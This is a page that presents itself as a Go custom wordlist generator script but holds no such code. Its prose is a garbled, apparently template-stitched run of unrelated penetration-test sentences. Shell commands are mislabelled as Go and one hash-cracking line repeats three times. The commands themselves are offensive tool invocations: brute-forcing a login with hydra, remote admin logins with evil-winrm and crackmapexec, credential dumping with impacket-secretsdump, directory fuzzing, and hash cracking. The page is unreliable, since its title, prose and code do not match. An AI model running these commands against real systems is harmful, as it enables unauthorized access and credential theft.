---
TitleSEO: "Custom Wordlist Generator in Go | ZureFX"
TitlePost: "Custom Wordlist Generator — Go"
Author: "ZureFX"
Description: "A Go script for custom wordlist generator. Built for security research and automation."
Keywords: "rust, scanner, c, script, go"
URL: "https://zurefx.github.io/scripting/script-custom-wordlist-generator-937.html"
URL_IMAGES: ""
Date: "2025-05-08"
Tags: "Rust, Scanner, C, Script, Go"
Section: "scripting"
Lang: "en"
main_img: "script-custom-wordlist-generator-937"
Permalink: "/scripting/script-custom-wordlist-generator-937.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Weak file permissions allowed modification of critical system files. The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `smbexec`
- `ldapsearch`
- `atexec`

## Implementation

### Core Logic

Authentication bypass was achieved through careful manipulation of the login mechanism. Post-exploitation enumeration revealed a path to domain administrator privileges.

```go
feroxbuster -h
```

The backup files contained sensitive information that should not have been accessible. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Helper Functions

Initial enumeration revealed several interesting open ports on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

```go
evil-winrm -i 10.18.91.246 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.65.161.9 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.38.137.29 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.98.122.244/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Usage

### Basic Usage

The kernel version was outdated and vulnerable to a publicly known exploit. Unconstrained delegation was enabled on the compromised machine.

```bash
gobuster dir -u http://10.50.108.197/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.94.121.21
```

### Advanced Options

Network traffic analysis revealed unencrypted communications containing user credentials. The backup files contained sensitive information that should not have been accessible. Command injection was possible through unsanitized user input in the search functionality.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.96.163.252/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Output

### Example Output

The target system was identified as running a vulnerable version of the service. Weak file permissions allowed modification of critical system files.

```
[+] Scanning target...
[+] Found 2 results
[+] Done in 4.41s
```
